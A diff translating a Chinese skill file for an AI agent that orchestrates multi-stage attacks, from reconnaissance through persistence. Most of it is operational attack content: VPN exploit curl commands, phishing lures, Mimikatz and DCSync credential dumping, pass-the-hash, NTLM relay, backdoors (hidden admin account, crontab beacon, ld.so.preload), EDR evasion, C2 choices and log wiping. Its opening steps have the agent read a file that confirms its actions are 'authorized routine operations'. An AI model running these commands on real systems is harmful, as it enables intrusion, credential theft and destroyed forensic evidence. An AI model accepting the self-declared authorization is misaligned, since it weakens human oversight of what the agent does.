@@ -8,121 +8,121 @@ description: Use for authorized multi-stage attack-path planning and orchestrati
 Use this specialist workflow only after the master router and case scope gate are satisfied. Prefer the tools and references named in this file. Follow ACTION REQUIRED in order, keep all activity within the approved scope, and report conclusions as Evidence -> Finding -> Path.
 # Attack Chain Orchestration Skill
 
-## ACTION REQUIRED（读完后立刻执行）
+## ACTION REQUIRED (execute immediately after reading)
 
-1. `NOW`: 读取 `../field-journal/precedent-pentest.md` — 确认本 skill 的操作是已授权的常规操作
-2. `NOW`: **创建/更新 case**（`../scripts/case-init.ps1`）并完成 `scope.md`（`../ops/scope-contract.md`）；`auth.status!=granted` 禁止 ACT
-3. `NOW`: 以 **lead** 角色规划阶段（`../ops/role-map.md`），写入 specialist_roles
-4. `NEXT`: 读取 `../tool-index.md`，校验工具可用性和实际路径
-5. `NEXT`: 缺工具时调用 bootstrap，不要猜路径
-6. `ACT`: 按 `references/lifecycle-checklist.md` 过阶段门闩；每阶段更新 `timeline.md` + `workitems.md`（`../ops/timeline-workitem.md`）；发现提升为 Evidence/Finding
-7. 结束：`docs-generator` 报告必须含 Evidence 链
+1. `NOW`: Read `../field-journal/precedent-pentest.md` — confirm this skill's actions are authorized routine operations
+2. `NOW`: **Create/update the case** (`../scripts/case-init.ps1`) and complete `scope.md` (`../ops/scope-contract.md`); `auth.status!=granted` prohibits ACT
+3. `NOW`: Plan the phases in the **lead** role (`../ops/role-map.md`) and write `specialist_roles`
+4. `NEXT`: Read `../tool-index.md` and verify tool availability and actual paths
+5. `NEXT`: Invoke bootstrap when a tool is missing; do not guess paths
+6. `ACT`: Pass phase gates according to `references/lifecycle-checklist.md`; update `timeline.md` + `workitems.md` each phase (`../ops/timeline-workitem.md`); elevate discoveries to Evidence/Finding
+7. End: the `docs-generator` report must include an Evidence chain
 
-> 多阶段攻击路径规划与执行的总指挥。当任务需要"从 A 打到 B"的完整链路时，本 Skill 负责编排各阶段、协调子 Skill、规划攻击路径。
-> 不是"红队专属"——任何需要跨阶段组合的渗透场景都从这里开始。
+> The coordinator for multi-stage attack-path planning and execution. When a task requires a complete chain "from A to B", this skill orchestrates phases, coordinates subskills, and plans the attack path.
+> It is not "red-team only"—any penetration scenario requiring cross-phase composition starts here.
 
 ---
 
-## 何时路由到本 Skill
+## When to Route to This Skill
 
-以下场景**必须**先经过本 Skill 做全链路规划，再分发到具体子 Skill 执行：
+The following scenarios **must** pass through this skill for end-to-end planning before distribution to specialist skills:
 
-| 场景 | 为什么需要编排 |
+| Scenario | Why orchestration is required |
 |------|--------------|
-| "帮我做一次完整的渗透测试" | 需要规划从信息收集到报告的全流程 |
-| "从外网打到域控" | 跨越边界突破→提权→横向→AD 多个阶段 |
-| "HW 攻防演练" | 需要完整攻击链 + 隐蔽性 + 痕迹清理 |
-| "评估这个目标的攻击面" | 需要多维度信息收集 + 路径规划 |
-| "我拿到了一个 webshell，下一步怎么办" | 需要从当前据点规划后续路径 |
-| "帮我规划攻击路径" | 明确需要路径编排 |
-| "从这个漏洞能打到什么程度" | 需要评估漏洞的链式利用价值 |
-| "Bug Bounty 持续监控" | 需要自动化多阶段流程 |
-| "内网渗透全流程" | 横向移动 + 提权 + 域攻击组合 |
-| "近源渗透方案" | 物理接入 + 内网渗透组合 |
-| "供应链攻击路径" | 跨组织多跳攻击 |
-| "钓鱼 + 后渗透" | 初始访问 + 后续利用组合 |
+| "Perform a complete penetration test" | Requires planning the full workflow from reconnaissance through reporting |
+| "Reach the domain controller from the external network" | Crosses multiple phases: initial access → privilege escalation → lateral movement → AD |
+| "HW red-team exercise" | Requires a complete attack chain + stealth + artifact cleanup |
+| "Assess this target's attack surface" | Requires multidimensional reconnaissance + path planning |
+| "I obtained a webshell; what next?" | Requires planning the next path from the current foothold |
+| "Help me plan an attack path" | Explicitly requires path orchestration |
+| "How far can this vulnerability get me?" | Requires assessing the vulnerability's chained exploitation value |
+| "Continuous Bug Bounty monitoring" | Requires an automated multi-stage workflow |
+| "Complete internal-network penetration workflow" | Combines lateral movement + privilege escalation + domain attacks |
+| "Near-source penetration plan" | Combines physical access + internal-network penetration |
+| "Supply-chain attack path" | Multi-hop attacks across organizations |
+| "Phishing + post-exploitation" | Initial access + follow-on exploitation |
 
-**单阶段任务不需要经过本 Skill**：
-- 只做端口扫描 → 直接去 `pentest-tools/`
-- 只做 SQL 注入 → 直接去 `pentest-tools/`
-- 只做 APK 逆向 → 直接去 `apk-reverse/`
-- 只做域渗透 → 直接去 `windows-ad/SKILL.md`
-
----
-
-## 编排原则
-
-### 本 Skill 的角色
-
-```
-用户提出多阶段任务
-    ↓
-attack-chain/SKILL.md（本文件）
-    ↓ 规划攻击路径、确定阶段顺序
-    ↓ 评估每阶段所需工具和方法
-    ↓
-分发到具体子 Skill 执行：
-    ├── pentest-tools/     → 工具调用、漏洞利用
-    ├── apk-reverse/       → 移动端渗透
-    ├── js-reverse/        → Web 前端突破
-    ├── reverse-engineering/ → 二进制分析
-    ├── ida-reverse/       → 深度逆向
-    └── browser-automation/ → 自动化操作
-    ↓
-每阶段完成后回到本 Skill 评估下一步
-    ↓
-全部完成 → docs-generator 生成报告
-```
-
-### 路径规划决策树
-
-```
-拿到目标后：
-1. 目标是什么？（Web/内网/云/移动/IoT）
-2. 当前有什么？（外部视角/已有凭据/已有据点）
-3. 最终目标是什么？（域控/数据/特定系统/证明影响）
-4. 约束条件？（时间/隐蔽性/不可触碰的系统）
-    ↓
-根据以上信息规划最短路径
-    ↓
-一条路走不通 → 回到本 Skill 重新规划备选路径
-```
+**Single-stage tasks do not need this skill**:
+- Port scanning only → go directly to `pentest-tools/`
+- SQL injection only → go directly to `pentest-tools/`
+- APK reverse engineering only → go directly to `apk-reverse/`
+- Domain penetration only → go directly to `windows-ad/SKILL.md`
 
 ---
 
-## 完整攻击链阶段
+## Orchestration Principles
+
+### Role of This Skill
+
+```
+User submits a multi-stage task
+    ↓
+attack-chain/SKILL.md (this file)
+    ↓ Plan the attack path and determine phase order
+    ↓ Assess the tools and methods required for each phase
+    ↓
+Distribute execution to specific subskills:
+    ├── pentest-tools/     → Tool invocation and vulnerability exploitation
+    ├── apk-reverse/       → Mobile penetration testing
+    ├── js-reverse/        → Web front-end compromise
+    ├── reverse-engineering/ → Binary analysis
+    ├── ida-reverse/       → In-depth reverse engineering
+    └── browser-automation/ → Automated operations
+    ↓
+Return to this skill after each phase to assess the next step
+    ↓
+All phases complete → docs-generator generates the report
+```
+
+### Path-Planning Decision Tree
+
+```
+After obtaining the target:
+1. What is the target? (Web/internal network/cloud/mobile/IoT)
+2. What is currently available? (external perspective/existing credentials/existing foothold)
+3. What is the ultimate objective? (domain controller/data/specific system/proof of impact)
+4. What are the constraints? (time/stealth/systems that must not be touched)
+    ↓
+Plan the shortest path based on the information above
+    ↓
+If one path fails → return to this skill and replan an alternative
+```
 
 ---
 
-## 一、信息收集阶段（Reconnaissance）
+## Complete Attack-Chain Phases
 
-### 1.1 企业数字资产测绘
+---
+
+## I. Reconnaissance Phase
+
+### 1.1 Corporate Digital Asset Mapping
 
 ```bash
-# 子公司关联域名发现
+# Discover domains associated with subsidiaries
 subfinder -d target.com -o subdomains.txt
 amass enum -d target.com -passive -o amass_results.txt
 
-# 合并去重
+# Merge and deduplicate
 cat subdomains.txt amass_results.txt | sort -u > all_subs.txt
 
-# 存活探测
+# Probe for live hosts
 httpx -l all_subs.txt -status-code -title -tech-detect -o alive.txt
 
-# 端口扫描（全端口）
+# Port scan (all ports)
 naabu -l all_subs.txt -top-ports 1000 -o ports.txt
 nmap -sV -sC -iL targets.txt -oA nmap_results
 ```
 
-**实战要点**：
-- 通过企查查/天眼查获取子公司列表，扩大攻击面
-- 关注测试环境（test.、dev.、staging.）和新上线系统
-- 证书透明度日志（crt.sh）发现隐藏域名
+**Practical points**:
+- Obtain a subsidiary list through Qichacha/Tianyancha to expand the attack surface
+- Focus on test environments (test., dev., staging.) and newly deployed systems
+- Find hidden domains in certificate transparency logs (crt.sh)
 
-### 1.2 敏感信息泄露狩猎
+### 1.2 Sensitive Information Leak Hunting
 
 ```bash
-# GitHub 搜索
+# GitHub search
 # org:Company filename:.env password
 # org:Company filename:config.yml secret
 # org:Company "jdbc:mysql" password
@@ -132,207 +132,207 @@ nmap -sV -sC -iL targets.txt -oA nmap_results
 # site:target.com inurl:admin
 # site:target.com ext:conf|cfg|ini
 
-# JS 文件中的 API Key
+# API keys in JS files
 cat js_urls.txt | while read url; do
   curl -s "$url" | grep -oP '(api[_-]?key|secret|token|password)\s*[:=]\s*["\047][^"\047]+'
 done
 ```
 
-**高价值目标**：
-- 云服务 AK/SK（阿里云、AWS、Azure）
-- 数据库连接字符串
-- JWT 密钥
-- 内部 API 文档
-- VPN/堡垒机凭据
+**High-value targets**:
+- Cloud service AK/SK (Alibaba Cloud, AWS, Azure)
+- Database connection strings
+- JWT signing keys
+- Internal API documentation
+- VPN/jump-server credentials
 
-### 1.3 员工信息画像
+### 1.3 Employee Profile Mapping
 
-**社工字典生成规则**：
+**Social-engineering dictionary generation rules**:
 ```
-{姓名拼音}{年份}       → zhangsan2024
-{姓名首字母}{部门缩写}  → zs_dev
-{工号}@{域名}          → 10086@target.com
-{姓名}{常见后缀}       → zhangsan@123, zhangsan!@#
+{pinyin_name}{year}       → zhangsan2024
+{initials}{department_abbreviation}  → zs_dev
+{employee_id}@{domain}          → 10086@target.com
+{name}{common_suffix}       → zhangsan@123, zhangsan!@#
 ```
 
-**信息来源**：
-- 脉脉/LinkedIn 部门架构
-- 企业公众号/官网团队介绍
-- 招聘信息（技术栈暴露）
-- 学术论文（邮箱暴露）
+**Information sources**:
+- Maimai/LinkedIn department structures
+- Company public accounts/official website team pages
+- Job postings (technology-stack exposure)
+- Academic papers (email exposure)
 
-### 1.4 技术栈指纹识别
+### 1.4 Technology Stack Fingerprinting
 
 ```bash
-# Web 指纹
+# Web fingerprinting
 whatweb -i alive.txt --log-json=fingerprint.json
 httpx -l alive.txt -tech-detect -json -o tech.json
 
-# 特定框架探测
+# Detect specific frameworks
 nuclei -l alive.txt -tags tech -severity info -o tech_results.txt
 
-# CMS 识别
+# CMS identification
 wpscan --url https://target.com --enumerate p,t,u
 ```
 
 ---
 
-## 二、边界突破阶段（Initial Access）
+## II. Initial Access Phase
 
-### 2.1 Web 漏洞利用（高频突破点）
+### 2.1 Web Exploitation (Common Entry Points)
 
-| 漏洞类型 | 检测工具 | 利用方式 |
+| Vulnerability Type | Detection Tool | Exploitation Method |
 |---------|---------|---------|
-| SQL 注入 | sqlmap | 数据提取 → 写 shell → OS 命令 |
-| SSTI | sstimap | 模板注入 → RCE |
-| 文件上传 | 手工 + Burp | Webshell → 反弹 shell |
-| 反序列化 | ysoserial/marshalsec | Java/PHP/Python RCE |
-| SSRF | 手工 | 内网探测 → 云元数据 → AK/SK |
-| 未授权访问 | nuclei | Spring Actuator / Nacos / Redis |
-| XSS → Cookie | xsstrike | 管理员会话劫持 |
+| SQL injection | sqlmap | Data extraction → write shell → OS command |
+| SSTI | sstimap | Template injection → RCE |
+| File upload | Manual + Burp | Webshell → reverse shell |
+| Deserialization | ysoserial/marshalsec | Java/PHP/Python RCE |
+| SSRF | Manual | Internal-network probing → cloud metadata → AK/SK |
+| Unauthenticated access | nuclei | Spring Actuator / Nacos / Redis |
+| XSS → Cookie | xsstrike | Administrator session hijacking |
 
 ```bash
-# SQL 注入自动化
+# Automated SQL injection
 sqlmap -u "https://target.com/api?id=1" --batch --dbs --random-agent
 
-# SSTI 检测
+# SSTI detection
 sstimap -u "https://target.com/search?q=test"
 
 # Nuclei batch scanning
 nuclei -l alive.txt -severity critical,high -tags cve,sqli,rce -o vulns.txt
 ```
 
-### 2.2 供应链攻击
+### 2.2 Supply-Chain Attacks
 
-**攻击路径**：
-1. 识别目标使用的第三方组件/服务商
-2. 攻击供应商获取代码签名/更新推送权限
-3. 通过合法更新通道投递恶意载荷
+**Attack path**:
+1. Identify the third-party components/service providers used by the target
+2. Compromise a supplier to obtain code-signing or update-distribution permissions
+3. Deliver a malicious payload through a legitimate update channel
 
-**常见入口**：
-- 开源组件投毒（npm/pip/maven）
-- SaaS 服务商 API 滥用
-- 外包人员权限利用
-- 共享 IT 服务商横向渗透
+**Common entry points**:
+- Open-source component poisoning (npm/pip/maven)
+- SaaS provider API abuse
+- Exploitation of outsourced personnel privileges
+- Lateral penetration through shared IT service providers
 
-### 2.3 钓鱼攻击
+### 2.3 Phishing Attacks
 
-**邮件钓鱼**：
+**Email phishing**:
 ```
-主题模板：
-- [紧急] VPN 证书即将过期，请立即更新
-- [IT通知] 邮箱存储空间不足，请清理
-- [HR] 2024年度绩效考核结果查询
-- [财务] 报销系统升级，请重新登录确认
+Subject templates:
+- [Urgent] VPN certificate is about to expire; update immediately
+- [IT Notice] Mailbox storage is insufficient; clean it up
+- [HR] 2024 annual performance review results
+- [Finance] Expense system upgrade; log in again to confirm
 ```
 
-**载荷类型**：
-- Office 宏文档（.docm/.xlsm）
-- LNK 快捷方式（伪装 PDF）
-- HTML 走私（HTML Smuggling）
-- ISO/IMG 镜像（绕过 MOTW）
-- OneNote 嵌入脚本
+**Payload types**:
+- Office macro documents (.docm/.xlsm)
+- LNK shortcuts (disguised as PDFs)
+- HTML smuggling (HTML Smuggling)
+- ISO/IMG images (bypassing MOTW)
+- OneNote embedded scripts
 
-**OAuth 钓鱼**（2025 新趋势）：
-- 构造恶意 OAuth 应用请求权限
-- 用户授权后获取邮箱/文件访问权限
-- 无需密码，绕过 MFA
+**OAuth phishing** (new trend in 2025):
+- Craft a malicious OAuth app permission request
+- Obtain email/file access after user authorization
+- Bypass MFA without a password
 
-### 2.4 近源渗透（Physical Access）
+### 2.4 Near-Source Penetration (Physical Access)
 
-| 手法 | 工具 | 效果 |
+| Technique | Tool | Effect |
 |------|------|------|
-| BadUSB | Rubber Ducky / WiFi Ducky | 键盘注入 → 反弹 shell |
-| 恶意充电宝 | O.MG Cable | 伪装数据线植入后门 |
-| WiFi 钓鱼 | Fluxion / WiFi Pineapple | 伪造热点 → 凭据捕获 |
-| RFID 克隆 | Proxmark3 | 门禁卡复制 → 物理进入 |
-| 网络植入 | Raspberry Pi / LAN Turtle | 内网持久接入点 |
+| BadUSB | Rubber Ducky / WiFi Ducky | Keyboard injection → reverse shell |
+| Malicious power bank | O.MG Cable | Implant a backdoor in a disguised data cable |
+| WiFi phishing | Fluxion / WiFi Pineapple | Fake access point → credential capture |
+| RFID cloning | Proxmark3 | Access-card cloning → physical entry |
+| Network implant | Raspberry Pi / LAN Turtle | Persistent internal-network access point |
 
 ```bash
-# Fluxion WiFi 钓鱼
-fluxion  # 交互式选择目标 AP → 创建伪造热点 → 捕获 WPA 密码
+# Fluxion WiFi phishing
+fluxion  # Interactively select a target AP → create a fake access point → capture the WPA password
 
-# BadUSB 联动 Cobalt Strike
-# 通过 USB 注入 PowerShell 下载器 → 上线 C2
+# BadUSB with Cobalt Strike
+# Inject a PowerShell downloader through USB → connect to C2
 ```
 
-### 2.5 VPN/远程接入突破
+### 2.5 VPN/Remote Access Compromise
 
 ```bash
-# Pulse Secure VPN（CVE-2019-11510）
+# Pulse Secure VPN (CVE-2019-11510)
 curl -k "https://vpn.target.com/dana-na/../dana/html5acc/guacamole/../../../etc/passwd?/dana/html5acc/guacamole/"
 
-# Fortinet VPN（CVE-2018-13379）
+# Fortinet VPN (CVE-2018-13379)
 curl -k "https://vpn.target.com/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"
 
-# 通用：密码喷洒
+# Generic: password spraying
 hydra -L users.txt -P passwords.txt vpn.target.com https-form-post
 ```
 
-### 2.6 云服务突破
+### 2.6 Cloud Service Compromise
 
 ```bash
-# AWS S3 桶枚举
+# AWS S3 bucket enumeration
 aws s3 ls s3://target-bucket --no-sign-request
 
-# 云元数据 SSRF
+# Cloud metadata SSRF
 curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
 
-# Azure AD 密码喷洒
-# 使用 MSOLSpray / Spray 工具
+# Azure AD password spraying
+# Use the MSOLSpray / Spray tools
 ```
 
 ---
 
-## 三、权限提升阶段（Privilege Escalation）
+## III. Privilege Escalation Phase
 
-### 3.1 Windows 提权
+### 3.1 Windows Privilege Escalation
 
-| 技术 | 条件 | 工具 |
+| Technique | Condition | Tool |
 |------|------|------|
-| Potato 系列 | SeImpersonate 权限 | SweetPotato / GodPotato / PrintSpoofer |
-| 内核漏洞 | 未打补丁 | watson / wesng 检测 |
-| 服务路径劫持 | 不带引号的服务路径 | PowerUp |
-| DLL 劫持 | 可写 DLL 搜索路径 | Process Monitor |
-| AlwaysInstallElevated | 注册表配置 | msiexec 安装恶意 MSI |
-| 计划任务 | 可写任务脚本 | schtasks 替换 |
+| Potato family | SeImpersonate privilege | SweetPotato / GodPotato / PrintSpoofer |
+| Kernel vulnerabilities | Unpatched system | watson / wesng detection |
+| Service path hijacking | Unquoted service path | PowerUp |
+| DLL hijacking | Writable DLL search path | Process Monitor |
+| AlwaysInstallElevated | Registry configuration | msiexec installs a malicious MSI |
+| Scheduled tasks | Writable task script | schtasks replacement |
 
 ```powershell
-# 检测 SeImpersonate
+# Detect SeImpersonate
 whoami /priv | findstr "SeImpersonate"
 
-# Potato 提权
+# Potato privilege escalation
 .\GodPotato.exe -cmd "cmd /c whoami"
 
 # Automated detection
 .\winPEAS.exe
 ```
 
-### 3.2 Linux 提权
+### 3.2 Linux Privilege Escalation
 
 ```bash
-# SUID 检测
+# SUID detection
 find / -perm -4000 -type f 2>/dev/null
 
-# sudo 滥用
+# sudo abuse
 sudo -l
-# 常见可利用：vim, find, python, nmap, less, awk, perl
+# Commonly exploitable: vim, find, python, nmap, less, awk, perl
 
-# sudo vim 提权
+# sudo vim privilege escalation
 sudo vim -c ':!/bin/bash'
 
-# sudo find 提权
+# sudo find privilege escalation
 sudo find / -exec /bin/bash \;
 
-# 内核漏洞
-uname -r  # 检查版本
+# Kernel vulnerabilities
+uname -r  # Check the version
 # DirtyPipe (CVE-2022-0847), DirtyCow (CVE-2016-5195)
 
-# 自动化检测
+# Automated detection
 ./linpeas.sh
 ```
 
-### 3.3 数据库提权
+### 3.3 Database Privilege Escalation
 
 ```sql
 -- MSSQL xp_cmdshell
@@ -348,42 +348,42 @@ SELECT sys_exec('id');
 COPY (SELECT '') TO PROGRAM 'id';
 ```
 
-### 3.4 云权限提升
+### 3.4 Cloud Privilege Escalation
 
 ```bash
-# AWS IAM 枚举
+# AWS IAM enumeration
 aws iam list-attached-user-policies --user-name compromised-user
-# 寻找 iam:PassRole + lambda:CreateFunction → 管理员权限
+# Look for iam:PassRole + lambda:CreateFunction → administrator privileges
 
 # Azure AD
-# 全局管理员 → 所有订阅控制
-# 应用管理员 → 添加凭据到服务主体
+# Global administrator → control of all subscriptions
+# Application administrator → add credentials to a service principal
 ```
 
 ---
 
-## 四、横向移动阶段（Lateral Movement）
+## IV. Lateral Movement Phase
 
-### 4.1 凭据获取
+### 4.1 Credential Access
 
 ```bash
-# Mimikatz（Windows）
+# Mimikatz (Windows)
 mimikatz# sekurlsa::logonpasswords
 mimikatz# lsadump::dcsync /domain:target.local /user:krbtgt
 
-# Linux 凭据
+# Linux credentials
 cat /etc/shadow
 cat ~/.bash_history | grep -i pass
 find / -name "*.conf" -exec grep -l "password" {} \;
 
-# NTLM Hash 提取
+# NTLM hash extraction
 secretsdump.py domain/user:password@dc_ip
 ```
 
 ### 4.2 Pass-the-Hash / Pass-the-Ticket
 
 ```bash
-# PTH 横向
+# PTH lateral movement
 crackmapexec smb 10.0.0.0/24 -u administrator -H <NTLM_HASH> --exec-method smbexec
 
 # Kerberoasting
@@ -396,77 +396,77 @@ GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip 10.0.0.1
 mimikatz# kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-... /krbtgt:<HASH> /ptt
 ```
 
-### 4.3 隐蔽横向技术
+### 4.3 Stealthy Lateral Movement Techniques
 
 ```bash
-# WMI 无文件执行
+# Fileless WMI execution
 wmiexec.py domain/admin:password@target_ip "whoami"
 
-# DCOM 远程执行
+# DCOM remote execution
 dcomexec.py domain/admin:password@target_ip "whoami"
 
 # WinRM
 evil-winrm -i target_ip -u admin -H <NTLM_HASH>
 
-# PsExec（会留痕）
+# PsExec (leaves artifacts)
 psexec.py domain/admin:password@target_ip
 
-# SSH 隧道（Linux 环境）
-ssh -D 1080 user@pivot_host  # SOCKS 代理
-ssh -L 3389:internal_host:3389 user@pivot_host  # 端口转发
+# SSH tunneling (Linux environment)
+ssh -D 1080 user@pivot_host  # SOCKS proxy
+ssh -L 3389:internal_host:3389 user@pivot_host  # Port forwarding
 ```
 
 ### 4.4 NTLM Relay
 
 ```bash
-# 关闭 Responder 的 SMB/HTTP
-# 编辑 Responder.conf: SMB = Off, HTTP = Off
+# Disable Responder's SMB/HTTP
+# Edit Responder.conf: SMB = Off, HTTP = Off
 
-# 启动 Responder 捕获
+# Start Responder capture
 responder -I eth0
 
-# NTLM Relay 到目标
+# NTLM relay to target
 ntlmrelayx.py -tf targets.txt -smb2support
 
-# Coercer 强制认证
+# Coercer forced authentication
 coercer coerce -u user -p password -d domain -l attacker_ip -t dc_ip
 ```
 
-### 4.5 AD 攻击路径
+### 4.5 AD Attack Paths
 
 ```bash
-# BloodHound 数据收集
+# BloodHound data collection
 bloodhound-python -d domain.local -u user -p password -c All -ns dc_ip
 
-# 常见攻击路径：
-# 1. 用户 → GenericAll → 目标用户 → 重置密码
-# 2. 用户 → WriteDacl → 目标 OU → 添加权限
-# 3. 计算机 → 约束委派 → 模拟任意用户
-# 4. 用户 → DCSync 权限 → 导出所有 Hash
+# Common attack paths:
+# 1. User → GenericAll → target user → reset password
+# 2. User → WriteDacl → target OU → add permissions
+# 3. Computer → constrained delegation → impersonate any user
+# 4. User → DCSync privilege → export all hashes
 
-# Certipy AD CS 攻击
+# Certipy AD CS attack
 certipy find -u user@domain -p password -dc-ip dc_ip
 certipy req -u user@domain -p password -ca CA-NAME -template VulnTemplate
 ```
 
 ---
 
-## 五、权限维持阶段（Persistence）
+## V. Persistence Phase
 
-### 5.1 Windows 持久化
+### 5.1 Windows Persistence
 
-| 技术 | 隐蔽性 | 检测难度 |
+| Technique | Stealth | Detection Difficulty |
 |------|:---:|:---:|
-| 计划任务 | 中 | 低 |
-| 注册表 Run 键 | 低 | 低 |
-| WMI 事件订阅 | 高 | 高 |
-| DLL 劫持 | 高 | 中 |
-| 影子账户 | 中 | 中 |
-| Golden Ticket | 极高 | 极高 |
-| DSRM 后门 | 极高 | 极高 |
+| Scheduled tasks | Medium | Low |
+| Registry Run key | Low | Low |
+| WMI event subscription | High | High |
+| DLL hijacking | High | Medium |
+| Shadow account | Medium | Medium |
+| Golden Ticket | Very high | Very high |
+| DSRM backdoor | Very high | Very high |
 
 ```powershell
-# WMI 事件订阅（高隐蔽）
+# WMI event subscription (high stealth)
 $Filter = Set-WmiInstance -Class __EventFilter -Arguments @{
     Name = "CoreFilter"
     EventNameSpace = "root\cimv2"
@@ -474,28 +474,28 @@ $Filter = Set-WmiInstance -Class __EventFilter -Arguments @{
     Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
 }
 
-# 影子账户
+# Shadow account
 net user support$ P@ssw0rd /add /active:yes
 net localgroup administrators support$ /add
-# 修改注册表 F 值克隆 RID
+# Modify the registry F value to clone the RID
 ```
 
-### 5.2 Linux 持久化
+### 5.2 Linux Persistence
 
 ```bash
-# SSH 密钥植入
+# SSH key injection
 echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys
 
-# Crontab 后门
+# Crontab backdoor
 (crontab -l; echo "*/5 * * * * /tmp/.hidden/beacon") | crontab -
 
-# LD_PRELOAD 劫持
+# LD_PRELOAD hijacking
 echo "/tmp/.hidden/evil.so" > /etc/ld.so.preload
 
-# PAM 后门
-# 修改 pam_unix.so 添加万能密码
+# PAM backdoor
+# Modify pam_unix.so to add a universal password
 
-# Systemd 服务
+# Systemd service
 cat > /etc/systemd/system/update.service << 'EOF'
 [Unit]
 Description=System Update Service
@@ -508,148 +508,147 @@ EOF
 systemctl enable update.service
 ```
 
-### 5.3 云环境持久化
+### 5.3 Cloud Environment Persistence
 
 ```bash
-# AWS Lambda 后门
-# 创建定时触发的 Lambda 函数，回连 C2
+# AWS Lambda backdoor
+# Create a periodically triggered Lambda function that calls back to C2
 
-# Azure AD 应用注册
-# 创建应用 → 添加密钥凭据 → 授予 Graph API 权限
+# Azure AD application registration
+# Create an application → add a secret credential → grant Graph API permissions
 
-# 容器后门
-# 修改基础镜像 → 所有新容器自带后门
+# Container backdoor
+# Modify the base image → all new containers include the backdoor
 ```
 
 ---
 
-## 六、EDR/AV 绕过（Evasion）
+## VI. EDR/AV Evasion
 
-### 6.1 核心绕过思路
+### 6.1 Core Evasion Concepts
 
-| 层面 | 技术 | 说明 |
+| Layer | Technique | Description |
 |------|------|------|
-| 静态检测 | 加密/混淆/自定义加载器 | 避免签名匹配 |
-| 行为检测 | 间接系统调用/Unhooking | 绕过 API Hook |
-| 内存检测 | 模块踩踏/堆加密 | 避免内存扫描 |
-| 网络检测 | 域前置/合法服务隧道 | 混入正常流量 |
-| 日志检测 | ETW Patching/日志清除 | 减少痕迹 |
+| Static detection | Encryption/obfuscation/custom loader | Avoid signature matching |
+| Behavioral detection | Indirect system calls/Unhooking | Bypass API hooks |
+| Memory detection | Module stomping/heap encryption | Avoid memory scanning |
+| Network detection | Domain fronting/legitimate service tunneling | Blend into normal traffic |
+| Log detection | ETW patching/log clearing | Reduce artifacts |
 
 ### 6.2 Practical Evasion Techniques
 
 ```
-1. Shellcode 加载器自定义（不用公开工具）
-2. 系统调用直接调用（绕过 ntdll hook）
-3. 进程注入选择低监控进程（如 RuntimeBroker.exe）
-4. C2 流量走 HTTPS + 域前置 / Cloudflare Workers
-5. 内存中执行，不落盘（Fileless）
-6. 利用合法签名程序加载（LOLBins）
+1. Customize the shellcode loader (do not use public tools)
+2. Invoke system calls directly (bypass ntdll hooks)
+3. Inject into a low-monitoring process (such as RuntimeBroker.exe)
+4. Route C2 traffic through HTTPS + domain fronting / Cloudflare Workers
+5. Execute in memory without writing to disk (Fileless)
+6. Load through legitimately signed programs (LOLBins)
 ```
 
-### 6.3 C2 框架选择
+### 6.3 C2 Framework Selection
 
-| 框架 | 特点 | 适用场景 |
+| Framework | Characteristics | Use Case |
 |------|------|---------|
-| Cobalt Strike | 成熟稳定，团队协作 | 大型红队行动 |
-| Sliver | 开源，Go 编写 | 预算有限 |
-| Havoc | 现代化，模块化 | 需要定制 |
-| Mythic | 多 agent 支持 | 跨平台 |
-| AdaptixC2 | Kali 2026.1 收录 | 快速部署 |
+| Cobalt Strike | Mature and stable, team collaboration | Large red-team operations |
+| Sliver | Open source, written in Go | Limited budget |
+| Havoc | Modern, modular | Customization required |
+| Mythic | Multi-agent support | Cross-platform |
+| AdaptixC2 | Included in Kali 2026.1 | Rapid deployment |
 
 ---
 
-## 七、痕迹清理（Anti-Forensics）
+## VII. Artifact Cleanup (Anti-Forensics)
 
 ```bash
-# Windows 日志清除
+# Clear Windows logs
 wevtutil cl Security
 wevtutil cl System
 wevtutil cl Application
 
-# Linux 日志清除
+# Clear Linux logs
 echo > /var/log/auth.log
 echo > /var/log/syslog
 history -c && history -w
 
-# 时间戳修改
+# Modify timestamps
 touch -t 202301010000 /path/to/file
 
-# 内存清理
-# 确保 Mimikatz dump 已删除
-# 确保 C2 beacon 已退出
-# 确保临时文件已清除
+# Memory cleanup
+# Ensure the Mimikatz dump has been deleted
+# Ensure the C2 beacon has exited
+# Ensure temporary files have been cleared
 ```
 
 ---
 
-## 红队行动铁律
+## Red-Team Rules of Engagement
 
-### 三条底线
+### Three Non-Negotiables
 
-1. **所有操作必须获得书面授权**
-2. **数据渗出需进行匿名化处理**
-3. **清理所有攻击痕迹（包括内存驻留）**
+1. **All operations must have written authorization**
+2. **Exfiltrated data must be anonymized**
+3. **Clean up all attack artifacts (including resident memory)**
 
-### 行动纪律
+### Operational Discipline
 
-- 每个操作前评估风险等级（低/中/高/严重）
-- 高风险操作前通知项目经理
-- 保持操作日志（时间、动作、结果）
-- 发现高危漏洞立即上报，不扩大利用
-- 不影响业务可用性（禁止 DoS）
-- 不访问/下载真实用户数据
+- Assess the risk level (low/medium/high/critical) before every operation
+- Notify the project manager before high-risk operations
+- Maintain an operation log (time, action, result)
+- Report critical vulnerabilities immediately; do not expand exploitation
+- Do not affect service availability (DoS is prohibited)
+- Do not access or download real user data
 
-### 典型失败案例
+### Typical Failure Cases
 
-| 失败原因 | 后果 | 教训 |
+| Failure Cause | Consequence | Lesson |
 |---------|------|------|
-| 未清除 Mimikatz 内存 dump | 蓝队溯源完整攻击路径 | 操作后立即清理 |
-| C2 域名被威胁情报标记 | 首次连接即被拦截 | 使用新注册域名 + 域前置 |
-| 钓鱼邮件触发 DLP 告警 | 蓝队提前预警 | 测试邮件网关规则 |
-| 横向移动触发蜜罐 | 暴露攻击意图 | 先识别蜜罐再行动 |
+| Mimikatz memory dump not cleared | Blue team reconstructed the full attack path | Clean up immediately after operations |
+| C2 domain flagged by threat intelligence | Blocked on the first connection | Use a newly registered domain + domain fronting |
+| Phishing email triggered a DLP alert | Blue team received advance warning | Test mail-gateway rules |
+| Lateral movement triggered a honeypot | Attack intent was exposed | Identify honeypots before acting |
 
 ---
 
-## 工具速查表
+## Tool Quick Reference
 
-### 信息收集
+### Reconnaissance
 `subfinder` `amass` `httpx` `naabu` `katana` `gau` `dnsx` `nmap` `whatweb` `wpscan`
 
-### 漏洞利用
+### Exploitation
